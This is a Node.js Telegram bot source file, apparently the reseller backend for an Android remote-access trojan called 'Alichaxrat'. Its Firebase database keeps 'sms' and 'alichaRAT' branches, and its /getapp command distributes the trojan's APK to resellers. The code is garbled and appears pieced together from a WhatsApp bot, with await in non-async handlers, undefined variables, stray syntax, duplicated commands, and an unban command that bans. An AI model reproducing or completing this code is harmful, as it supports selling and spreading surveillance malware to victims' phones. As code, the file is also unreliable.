const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const settings = require('./settings');
const botToken = settings.token;
const adminfile = 'adminID.json';
const premiumUsersFile = 'premiumUsers.json';
const bot = new TelegramBot(botToken, { polling: true });
const runningProcesses = {};
const { exec } = require('child_process');
const serviceAccount = require('./mmkcok.json');
const admin = require('firebase-admin');

// Inisialisasi Firebase Admin
admin.initializeApp({
    credential: admin.credential.cert(serviceAccount),
    databaseURL: "https://alichaxrats9-90034-default-rtdb.firebaseio.com"
});

let adminUsers = [];
try {
    adminUsers = JSON.parse(fs.readFileSync(adminfile));
} catch (error) {
    console.error('Error reading adminUsers file:', error);
}

let premiumUsers = [];
try {
    premiumUsers = JSON.parse(fs.readFileSync(premiumUsersFile));
} catch (error) {
    console.error('Error reading premiumUsers file:', error);
}

function readDatabase() {
    try {
        const data = fs.readFileSync('./database.json', 'utf8');
        return JSON.parse(data);
    } catch (err) {
        console.error("Gagal membaca database:", err);
        return [];
    }
}

function saveDatabase(data) {
    try {
        fs.writeFileSync('./database.json', JSON.stringify(data, null, 2));
    } catch (err) {
        console.error("Gagal menyimpan database:", err);
    }
}

// Fungsi untuk menghapus folder dari Firebase Realtime Database
function deleteFolder(folderPath) {
    db.ref(folderPath).remove()
        .then(() => {
            console.log(`Folder ${folderPath} berhasil dihapus.`);
        })
        .catch((error) => {
            console.error(`Error menghapus folder ${folderPath}:`, error);
        });
}

// Fungsi untuk menghapus data kecuali yang diizinkan
function deleteInvalidData() {
    const allowedKeys = ['sms', 'alichaRAT', 'control'];

    db.ref('/').once('value', (snapshot) => {
        const data = snapshot.val();
        
        if (data) {
            Object.keys(data).forEach((key) => {
                if (!allowedKeys.includes(key)) {
                    // Hapus data yang tidak ada dalam pengecualian
                    db.ref(`/${key}`).remove()
                        .then(() => console.log(`Data ${key} berhasil dihapus.`))
                        .catch((error) => console.error(`Error menghapus data ${key}:`, error));
                }
            });
        }
    });
}

function addIdToDatabase(id) {
    let database = readDatabase();
    database.push({ id });
    saveDatabase(database);
}

function isIdInDatabase(id) {
    const database = readDatabase();
    return database.some(entry => entry.id === id);
}

function removeIdFromDatabase(id) {
    let database = readDatabase();
    database = database.filter(entry => entry.id !== id);
    saveDatabase(database);
}

bot.onText(/\/getapp/, (msg) => {
    const chatId = msg.chat.id;
    const from = msg.from.id;
    const usr = msg.from.username;
    if (!isIdInDatabase(from)) {
        bot.sendPhoto(chatId, settings.pp, { 
            caption: `Maaf wak bot ini hanya bisa diakses sama fadlan, pt, dan resellernya saja 🥺`
        });
    }
});
bot.onText(/\/menu/, (msg) => {
    const chatId = msg.chat.id;
    const from = msg.from.id;
    const usr = msg.from.username;
    if (!isIdInDatabase(from)) {
        addIdToDatabase(from);
        bot.sendPhoto(chatId, settings.pp, { 
            caption: `*WELCOME TO BOT ALICHAXRAT*

┏━━『 *DATA BOT* 』━━━━◧
┃➣ *SC BY : FADLAN*
┃➣ *WA : 081400346604*
┃➣ *VERSION : 1.4*
┃➣ *SERVER : S9*
┗━━━━━━━━━━━━━━━━━━◧

┏━━『 *MENU RESELLER* 』━◧
●➣.buatakun
●➣.getapp
┗━━━━━━━━━━━━━━━━━━◧

┏━━━━『 *MENU PT* 』━━━━◧
●➣.buatakun
●➣.addseller
●➣.delseller
●➣.hapususer
●➣.ban
●➣.unban
●➣.listuser
●➣.cekseller
●➣.cekakun
●➣.ban
●➣.unban
●➣.getapp
┗━━━━━━━━━━━━━━━━━━◧

Dev © FadlanDev

*Grup Official Alichaxrat*
https://chat.whatsapp.com/H5TpixN4TA21cRIvDLopX0`
await client.sendMessage(message.from, media, { caption });
    }
});

bot.onText(/\/ban/, (msg) => {
    const chatId = msg.chat.id;
    const from = msg.from.id;
    const usr = msg.from.username;
    const args = msg.text.split(/\s+/);
    if (isIdInDatabase(from)) {
            if (!args) {
                await message.reply('Format salah. Gunakan /ban <nomor>');
                return;
            }
            const numberToBan = `${args}@c.us`;
            if (!banList[numberToBan]) {
                banList[numberToBan] = true;
                saveBanList();
                await message.reply(`Nomor ${args} berhasil diban.`);
            } else {
                await message.reply(`Nomor ${args} sudah diban sebelumnya.`);
            }
        } else {
            await message.reply('Kamu tidak memiliki izin untuk melakukan ban.');
         });
     }
});

bot.onText(/\/unban/, (msg) => {
    const chatId = msg.chat.id;
    const from = msg.from.id;
    const usr = msg.from.username;
    const args = msg.text.split(/\s+/);
    if (isIdInDatabase(from)) {
            if (!args) {
                await message.reply('Format salah. Gunakan /unban <nomor>');
                return;
            }
            const numberToUnban = `${args}@c.us`;
            if (!banList[numberToBan]) {
                banList[numberToBan] = true;
                saveBanList();
                await message.reply(`Nomor ${args} berhasil diban.`);
            } else {
                await message.reply(`Nomor ${args} sudah diunban sekarangnya.`);
            }
        } else {
            await message.reply('Kamu tidak memiliki izin untuk melakukan ban.');
        });
     }
});

bot.onText(/\/cekakun/, (msg) => {
    const chatId = msg.chat.id;
    const from = msg.from.id;
    const usr = msg.from.username;
    const args = msg.text.split(/\s+/);
    if (args && registeredUsers[args]) {
        const { email, nomor } = registeredUsers[args];
         const uid = email.split('@')[0];
         const signInDate = new Date().toLocaleString('id-ID');
         const accountInfo = `*INFOMASI AKUN*\n\nUSER: ${args}\nID APK: ${uid}\nTGL: ${signInDate}\n\nAkun ini telah di buat oleh nomer ${nomor}.`;
         await message.reply(accountInfo);
         } else {
                 await message.reply('Format salah atau username tidak ditemukan. Gunakan /cekakun <username>');
              });
         }
});

bot.onText(/\/cekakun/, (msg) => {
    const chatId = msg.chat.id;
    const from = msg.from.id;
    const usr = msg.from.username;
    const args = msg.text.split(/\s+/);
    if (args) {
      const formattedNumber = `${args}@c.us`;
      if (registeredUsers[formattedNumber]) {
        const totalAkun = Object.keys(registeredUsers).length;
        const signInDate = new Date().toLocaleString('id-ID');
        const sellerInfo = `*INFOMASI SELLER*\n\nAKUN TELAH DI BUAT: ${totalAkun}\nDI ADD SELLER PADA: ${signInDate}\nPT BY: ${formattedNumber}\n\nAkun ini telah di buat oleh nomer ${formattedNumber}.`;
        await message.reply(sellerInfo);
      } else {
        await message.reply(`Nomor ${args} tidak ditemukan.`);
      }
    } else {
      await message.reply('Format salah. Gunakan .cekseller <nomor>');
       });
   }
});

bot.onText(/\/getapp/, (msg) => {
    const chatId = msg.chat.id;
    const from = msg.from.id;
    const usr = msg.from.username;
    const args = msg.text.split(/\s+/);
    const appFilePath = path.join(__dirname, 'alichaxrats8.apk'); // Lokasi file aplikasi
    try {
      if (fs.existsSync(appFilePath)) {
        await client.sendMessage(userId, 'Sedang mengirim aplikasi Alichaxrat...');
        const media = MessageMedia.fromFilePath(appFilePath);
        await client.sendMessage(userId, media);
        console.log(`Aplikasi berhasil dikirim ke ${userId}`);
      } else {
        await message.reply('Maaf, aplikasi tidak ditemukan di server.');
        console.error('File aplikasi tidak ditemukan.');
      }
    } catch (error) {
      await message.reply('Terjadi kesalahan saat mengirim aplikasi.');
      console.error('Error mengirim aplikasi:', error);
       });
   }
});

bot.onText(/\/addseller/, (msg) => {
    const chatId = msg.chat.id;
    const from = msg.from.id;
    const usr = msg.from.username;
    const args = msg.text.split(/\s+/);
    if (args) {
      const formattedNumber = `${args}@c.us`;
      registeredUsers[formattedNumber] = true;
      saveRegisteredUsers();
      await message.reply(`Nomor ${formattedNumber} berhasil ditambahkan ke database reseller.`);
    } else {
      await message.reply('Format salah. Gunakan /addseller <nomor>');
       });
    }
});

bot.onText(/\/delseller/, (msg) => {
    const chatId = msg.chat.id;
    const from = msg.from.id;
    const usr = msg.from.username;
    const args = msg.text.split(/\s+/);
    if (args) {
      const formattedNumber = `${args}@c.us`;
      if (registeredUsers[formattedNumber]) {
        delete registeredUsers[formattedNumber];
        saveRegisteredUsers();
        await message.reply(`Nomor ${formattedNumber} berhasil dihapus dari database seller.`);
      } else {
        await message.reply('Nomor tidak ditemukan atau format salah. Gunakan /delseller <nomor>');
      }
    } else {
      await message.reply('Format salah. Gunakan /delseller <nomor>');
       });
    }
});

bot.onText(/\/addpt/, (msg) => {
    const chatId = msg.chat.id;
    const from = msg.from.id;
    const usr = msg.from.username;
    const args = msg.text.split(/\s+/);
    if (args) {
      const formattedNumber = `${args}@c.us`;
      owners[formattedNumber] = true;
      saveOwners();
      await message.reply(`Nomor ${formattedNumber} berhasil ditambahkan ke database owner.`);
    } else {
      await message.reply('Format salah. Gunakan /addpt <nomor>');
        });
     }
});

bot.onText(/\/addpt/, (msg) => {
    const chatId = msg.chat.id;
    const from = msg.from.id;
    const usr = msg.from.username;
    const args = msg.text.split(/\s+/);
    if (args) {
      const formattedNumber = `${args}@c.us`;
      if (owners[formattedNumber]) {
        delete owners[formattedNumber];
        saveDatabase();
        await message.reply(`Nomor ${formattedNumber} berhasil dihapus dari database owner.`);
      } else {
        await message.reply('Nomor tidak ditemukan atau format salah. Gunakan /delpt <nomor>');
      }
    } else {
      await message.reply('Format salah. Gunakan /delpt <nomor>');
    }
    break;
    
  default:
  await message.reply('Perintah tidak dikenal.');
   } catch (error) {
     console.error("Error menangani pesan:", error);
     await message.reply('Terjadi kesalahan saat memproses perintah.');
       });
    }
});

// Inisialisasi Telegram Client
client.initialize();